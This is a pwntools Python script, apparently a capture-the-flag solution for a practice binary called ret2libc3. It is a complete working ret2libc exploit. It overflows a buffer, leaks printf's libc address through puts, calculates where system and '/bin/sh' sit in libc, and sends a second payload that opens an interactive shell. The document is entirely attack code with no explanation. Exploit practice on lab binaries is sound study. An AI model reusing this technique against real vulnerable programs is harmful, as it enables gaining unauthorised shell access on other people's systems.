from pwn import *

file = "./bin/ret2libc3"
elf = ELF(file)

payload = flat(b"a" * 112, elf.plt.puts, elf.symbols.main, elf.got.printf)

sh = elf.process()
sh.sendlineafter("Can you find it !?", payload)
buf = sh.recv()

_printf_got = u32(buf[:4])
diff = _printf_got - elf.libc.symbols.printf
_system = elf.libc.symbols.system + diff
_bin_sh = next(elf.libc.search(b"/bin/sh\x00")) + diff
payload = flat(b"a" * 104, _system, _bin_sh, _bin_sh)
sh.sendline(payload)
sh.interactive()
